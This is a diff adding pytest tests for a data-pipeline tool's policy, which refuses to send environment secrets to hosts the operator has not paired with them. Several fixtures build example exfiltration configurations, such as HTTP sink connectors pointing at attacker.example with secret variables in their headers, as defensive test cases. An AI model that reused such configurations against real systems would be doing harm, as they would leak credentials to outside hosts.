@@ -762,6 +762,35 @@ def test_pairing_the_project_supplied_host_does_not_pair_what_goes_to_it(
 
 
 @_SHAPES
+def test_a_secret_reference_beside_a_project_supplied_host_is_judged_on_the_rendered_host(
+    engine, project: Path, monkeypatch, shape
+):
+    """The other way a contract sends a secret: ``secretRef`` is judged by the secret policy on the
+    host the contract renders to, which is the project's here. The project's file never opened it,
+    and pairing the host variable alone does not pair the secret."""
+    from fluid_build.secrets.policy import AcquisitionSecretPolicyError
+    from fluid_build.secrets.run import secret_run
+
+    contract_for, pushed = engine
+    _hydrate(project, "ZZZ=attacker.example\n")
+    contract = contract_for()
+    _source(contract).pop("password", None)
+    _source(contract).update(
+        {"host": "{{ env.ZZZ }}", "secretRef": "env://DB_PW"}  # pragma: allowlist secret
+    )
+
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ@attacker.example")
+    with secret_run("apply"), pytest.raises(AcquisitionSecretPolicyError) as info:
+        _run(contract, project, shape)
+    assert "DB_PW" in str(info.value) and _PROBE not in str(info.value)
+    assert "attacker.example" not in pushed() and _PROBE not in pushed()
+
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ@attacker.example,DB_PW@attacker.example")
+    with secret_run("apply"):
+        assert _run(contract, project, shape) == 0, "the operator decides, with both entries"
+
+
+@_SHAPES
 def test_a_host_variable_the_operator_exports_stays_theirs(
     engine, project: Path, monkeypatch, shape
 ):
@@ -919,7 +948,7 @@ def test_a_tunnel_through_a_bastion_a_project_dotenv_names_is_refused(project: P
         check_env_pairing(contract)
     assert info.value.extras["origin"] == "project-dotenv"
     assert info.value.extras["host_variable"] == "B"
-    assert "bastion.attacker.example" not in repr(info.value.__dict__)
+    assert "bastion.attacker.example" not in repr(info.value.__dict__) + str(info.value)
 
 
 def test_an_address_the_policy_does_not_read_is_the_operators_only_while_the_value_is(
@@ -937,8 +966,80 @@ def test_an_address_the_policy_does_not_read_is_the_operators_only_while_the_val
     with pytest.raises(EnvTemplateError) as info:
         check_env_pairing(contract)
     assert "brokers" in info.value.what and "any host" in info.value.fix
+    assert "kafka.attacker.example" not in repr(info.value.__dict__) + str(info.value)
     monkeypatch.setenv(SECRET_REF_ALLOWLIST, "BROKERS,DB_PW")
     check_env_pairing(contract)
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        {"host": "db.example:{{ env.V }}"},  # a port
+        {"host": "{{ env.V }}.example"},  # text beside it
+        {"url": "postgres://{{ env.V }}@db.example/x"},  # userinfo
+    ],
+)
+def test_only_the_whole_host_variable_is_blamed_on_the_project_and_told_to_export(
+    value, project: Path, monkeypatch
+):
+    """A port, a user name or text beside it is paired whoever supplied it: exporting the variable
+    does not clear that, so the refusal does not say it does."""
+    _hydrate(project, "V=9999\n")
+    for _ in range(2):  # from the project's file, then exported by the operator as well
+        with pytest.raises(EnvTemplateError) as info:
+            check_host_templates(value, stage="fluid apply")
+        error = info.value
+        assert error.extras["reason"] == "unpaired" and "origin" not in error.extras
+        assert "project dotenv" not in error.what and "Export" not in error.fix
+        assert "V@" in error.fix
+        monkeypatch.setenv("V", "9999")
+
+
+def test_the_refusal_for_an_address_the_policy_cannot_read_names_the_projects_variable(
+    project: Path, monkeypatch
+):
+    """``db_host`` is read by nobody, so the entry for the host it holds is not enough: the next
+    refusal is the one that asks for any host, and it tells the operator what makes the address
+    theirs (a variable that is already one placeholder cannot be written as one)."""
+    _hydrate(project, "ZZZ=attacker.example\n")
+    contract = _airbyte_contract({"db_host": "{{ env.ZZZ }}", "password": "{{ env.DB_PW }}"})
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ@attacker.example")
+    with pytest.raises(EnvTemplateError) as info:
+        check_env_pairing(contract)
+    error = info.value
+    assert error.extras["origin"] == "project-dotenv" and error.extras["host_variable"] == "ZZZ"
+    assert "ZZZ, which a project dotenv file supplied" in error.what
+    assert "export ZZZ" in error.fix and "one {{ env.* }} placeholder" not in error.fix
+    assert "attacker.example" not in repr(error.__dict__) + str(error)
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ,DB_PW")
+    check_env_pairing(contract)
+
+
+@pytest.mark.parametrize(
+    "value", ["/data/x.db", "/v1/users", "sqlite:////data/x.db", "s3://bucket/x"]
+)
+def test_a_project_value_that_names_no_host_is_not_judged_as_one(value, project: Path):
+    """A path, a local database and a bucket name no host, written out or held by a variable."""
+    _hydrate(project, f"PROJV={value}\n")
+    check_host_templates({"uri": "{{ env.PROJV }}", "endpoint": "{{ env.PROJV }}"})
+    check_env_pairing(
+        _airbyte_contract({"db_host": "{{ env.PROJV }}", "password": "{{ env.DB_PW }}"})
+    )
+
+
+@pytest.mark.parametrize("value", ["https://attacker.example/x", "attacker.example:5432"])
+def test_a_project_value_that_names_a_host_is_judged_by_that_host(
+    value, project: Path, monkeypatch
+):
+    _hydrate(project, f"PROJV={value}\n")
+    with pytest.raises(EnvTemplateError) as info:
+        check_host_templates({"uri": "{{ env.PROJV }}"}, stage="fluid apply")
+    assert (
+        info.value.extras["variable"] == "PROJV" and info.value.extras["origin"] == "project-dotenv"
+    )
+    assert "attacker.example" not in repr(info.value.__dict__) + str(info.value)
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "PROJV@attacker.example")
+    check_host_templates({"uri": "{{ env.PROJV }}"})
 
 
 # The real command: ``fluid apply``'s own ``run`` reads the working directory's ``.env`` with the
@@ -991,3 +1092,231 @@ def test_apply_runs_a_host_the_operator_exports(engine, project: Path, monkeypat
 
     assert _apply(project, contract, monkeypatch) == 0
     assert "db.internal" in pushed() and "attacker.example" not in pushed()
+
+
+# ── the maps of an engine's own settings that a contract writes by hand ─────
+#
+# A runner pushes ``sink_connector_config`` (Kafka Connect), ``server.sink.config`` (Debezium Server),
+# ``extra_config`` (Debezium), ``target_config`` (Meltano) and ``destination_config`` (Airbyte) as they
+# are, merged over what it derives. ``{http.api.url: https://attacker.example/x, headers: "{{ env.X }}"}``
+# sent X to attacker.example, and no block the check judged named a variable beside that host.
+
+
+def _writes_a_sink_config(contract: Dict[str, Any]) -> str:
+    """Give the contract a hand-written sink config for its engine: the URL it sends to, and a
+    variable ``X`` beside it. The expose names no endpoint, so the map is the only destination.
+    Returns the field that holds the URL."""
+    build = contract["builds"][0]
+    props = build["properties"]
+    props["sink"] = {"format": "json"}
+    contract["exposes"][0]["binding"]["location"] = {"path": "./out"}
+    url = "https://attacker.example/x"
+    if build["engine"] == "kafka-connect":
+        props["kafka-connect"]["sink_connector_config"] = {
+            "connector.class": "io.confluent.connect.http.HttpSinkConnector",
+            "topics": "public.orders",
+            "http.api.url": url,
+            "headers": "{{ env.X }}",
+        }
+        return "sink_connector_config.http.api.url"
+    props["debezium"]["server"]["sink"] = {
+        "type": "http",
+        "config": {"url": url, "headers": "{{ env.X }}"},
+    }
+    return "server.sink.config.url"
+
+
+@_SHAPES
+def test_a_variable_in_a_hand_written_sink_config_goes_with_the_url_it_names(
+    engine, tmp_path: Path, monkeypatch, capsys, caplog, shape
+):
+    contract_for, pushed = engine
+    monkeypatch.setenv("X", _PROBE)
+    contract = contract_for()
+    field = _writes_a_sink_config(contract)
+
+    with caplog.at_level(logging.DEBUG):
+        rc = _run(contract, tmp_path, shape)
+
+    shown = capsys.readouterr()
+    everything = shown.out + shown.err + caplog.text
+    assert rc == 1
+    assert "{{ env.X }}" in everything, "the refusal names the variable"
+    assert "attacker.example" in everything and field in everything, "the URL and its field"
+    assert (
+        "FLUID_ACQUISITION_SECRET_REF_ALLOWLIST" in everything
+        and "X@attacker.example" in everything
+    )
+    assert _PROBE not in everything + pushed(), "never the value"
+    assert "attacker.example" not in pushed(), "nothing was started"
+
+
+@_SHAPES
+def test_the_operator_pairs_a_variable_with_the_url_a_hand_written_sink_config_names(
+    engine, tmp_path: Path, monkeypatch, shape
+):
+    contract_for, pushed = engine
+    monkeypatch.setenv("X", _PROBE)
+    contract = contract_for()
+    _writes_a_sink_config(contract)
+
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "X@elsewhere.example")
+    assert _run(contract, tmp_path, shape) == 1, "a pairing with another host does not count"
+
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "X@attacker.example")
+    assert _run(contract, tmp_path, shape) == 0
+    assert "attacker.example" in pushed() and _PROBE in pushed(), "the operator chose it"
+
+
+_MAPS = [
+    ("debezium", ("debezium", "extra_config")),
+    ("debezium", ("debezium", "server", "sink", "config")),
+    ("kafka-connect", ("kafka-connect", "sink_connector_config")),
+    ("meltano", ("meltano", "target_config")),
+    ("airbyte", ("airbyte", "destination_config")),
+]
+_MAP_IDS = [".".join(path) for _engine, path in _MAPS]
+
+
+def _with_a_map(
+    engine_name: str, path: Tuple[str, ...], config: Any, **source: Any
+) -> Dict[str, Any]:
+    """A contract whose build holds ``config`` at ``path`` under its properties. The source names
+    this machine, so only the map holds an endpoint a variable could go to."""
+    properties: Dict[str, Any] = {
+        "source": {"kind": "postgres", "connection": {"host": "localhost", **source}}
+    }
+    node = properties
+    for key in path[:-1]:
+        node = node.setdefault(key, {})
+    node[path[-1]] = config
+    return {
+        "builds": [{"id": "b", "engine": engine_name, "properties": properties}],
+        "exposes": [{"exposeId": "data", "binding": {"location": {"path": "./out/x.parquet"}}}],
+    }
+
+
+@pytest.mark.parametrize("engine_name, path", _MAPS, ids=_MAP_IDS)
+def test_every_hand_written_engine_map_is_judged_by_the_urls_it_names(
+    engine_name, path, monkeypatch
+):
+    config = {"url": "https://attacker.example/x", "headers": "{{ env.X }}"}
+    contract = _with_a_map(engine_name, path, config)
+    monkeypatch.setenv("X", _PROBE)
+
+    with pytest.raises(EnvTemplateError) as info:
+        check_env_pairing(contract, stage="fluid apply")
+
+    error = info.value
+    assert error.code == "EnvTemplateHostError" and error.extras["reason"] == "unpaired"
+    assert error.extras["variable"] == "X" and error.extras["entry"] == "X@attacker.example"
+    assert error.where == f"builds[0].properties.{'.'.join(path)}.headers"
+    assert f"{'.'.join(path)}.url" in error.what and "host 'attacker.example'" in error.what
+    assert _PROBE not in repr(error.__dict__)
+
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "X@elsewhere.example")
+    with pytest.raises(EnvTemplateError):
+        check_env_pairing(contract)
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, error.extras["entry"])
+    check_env_pairing(contract)
+
+
+@pytest.mark.parametrize("engine_name, path", _MAPS, ids=_MAP_IDS)
+def test_a_hand_written_engine_map_that_names_this_machine_or_the_operators_host_needs_no_pairing(
+    engine_name, path, monkeypatch
+):
+    monkeypatch.setenv("X", _PROBE)
+    monkeypatch.setenv("SINK_HOST", "sink.internal")
+    for config in (
+        {"url": "http://localhost:8083/x", "headers": "{{ env.X }}"},
+        {"url": "https://{{ env.SINK_HOST }}/x", "headers": "{{ env.X }}"},
+        {"tasks.max": "1", "headers": "{{ env.X }}"},  # names no endpoint at all
+    ):
+        check_env_pairing(_with_a_map(engine_name, path, config))
+
+
+@pytest.mark.parametrize("engine_name, path", _MAPS, ids=_MAP_IDS)
+def test_a_hand_written_engine_map_is_the_projects_choice_when_its_host_variable_is(
+    engine_name, path, project: Path, monkeypatch
+):
+    monkeypatch.delenv("SINK_HOST", raising=False)
+    _hydrate(project, "SINK_HOST=sink.attacker.example\n")
+    contract = _with_a_map(
+        engine_name, path, {"url": "https://{{ env.SINK_HOST }}/x", "headers": "{{ env.X }}"}
+    )
+    monkeypatch.setenv("X", _PROBE)
+    with pytest.raises(EnvTemplateError) as info:
+        check_env_pairing(contract)
+    assert info.value.extras["origin"] == "project-dotenv"
+    assert "sink.attacker.example" not in repr(info.value.__dict__)
+
+
+@pytest.mark.parametrize("value", ["a string", ["a", "list"], None, 5])
+@pytest.mark.parametrize("engine_name, path", _MAPS, ids=_MAP_IDS)
+def test_what_is_not_a_map_is_left_alone(engine_name, path, value):
+    check_env_pairing(_with_a_map(engine_name, path, value))
+
+
+def test_a_variable_in_the_source_does_not_go_to_the_sinks_url_and_the_other_way_round(
+    monkeypatch,
+):
+    """The source and the sink are two destinations: each variable goes where its own side sends."""
+    contract = _with_a_map(
+        "kafka-connect",
+        ("kafka-connect", "sink_connector_config"),
+        {"http.api.url": "https://sink.example/x", "headers": "{{ env.SINK_TOKEN }}"},
+        host="db.example",
+        password="{{ env.DB_PW }}",
+    )
+    monkeypatch.setenv("SINK_TOKEN", _PROBE)
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW@db.example,SINK_TOKEN@sink.example")
+    check_env_pairing(contract)
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW@db.example")
+    with pytest.raises(EnvTemplateError) as info:
+        check_env_pairing(contract)
+    assert info.value.extras["variable"] == "SINK_TOKEN"
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "SINK_TOKEN@sink.example")
+    with pytest.raises(EnvTemplateError) as info:
+        check_env_pairing(contract)
+    assert info.value.extras["variable"] == "DB_PW"
+
+
+def test_a_destination_airbyte_is_given_is_judged_on_its_own(monkeypatch):
+    """``destination_config`` replaces what Airbyte would derive: it is a destination of its own,
+    and no variable of the source goes there."""
+    contract = _with_a_map(
+        "airbyte",
+        ("airbyte", "destination_config"),
+        {"host": "dest.example", "password": "{{ env.DEST_PW }}"},
+        password="{{ env.DB_PW }}",
+    )
+    monkeypatch.setenv("DEST_PW", _PROBE)
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DEST_PW@dest.example")
+    check_env_pairing(contract)  # DB_PW goes to this machine, DEST_PW to dest.example
+    monkeypatch.delenv(SECRET_REF_ALLOWLIST)
+    with pytest.raises(EnvTemplateError) as info:
+        check_env_pairing(contract)
+    assert info.value.extras["variable"] == "DEST_PW"
+    assert "destination_config.host" in info.value.what
+
+
+def test_a_catalog_the_hand_written_config_points_elsewhere_gets_the_variables_of_the_expose(
+    monkeypatch,
+):
+    """The hand-written config is merged over what the runner derives from the expose, so its
+    ``iceberg.catalog.uri`` can send the expose's ``warehouse`` variable to a catalog of its own."""
+    contract = _kc_contract(
+        None,
+        location={**_catalog(_CATALOG_URI), "warehouse": "{{ env.WAREHOUSE }}"},
+        sink_connector_config={"iceberg.catalog.uri": "https://catalog.attacker.example/catalog"},
+    )
+    monkeypatch.setenv("WAREHOUSE", _PROBE)
+    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "WAREHOUSE@lakekeeper")
+    with pytest.raises(EnvTemplateError) as info:
+        check_env_pairing(contract)
+    assert "catalog.attacker.example" in info.value.what
+    assert info.value.extras["variable"] == "WAREHOUSE"
+    monkeypatch.setenv(
+        SECRET_REF_ALLOWLIST, "WAREHOUSE@lakekeeper,WAREHOUSE@catalog.attacker.example"
+    )
+    check_env_pairing(contract)
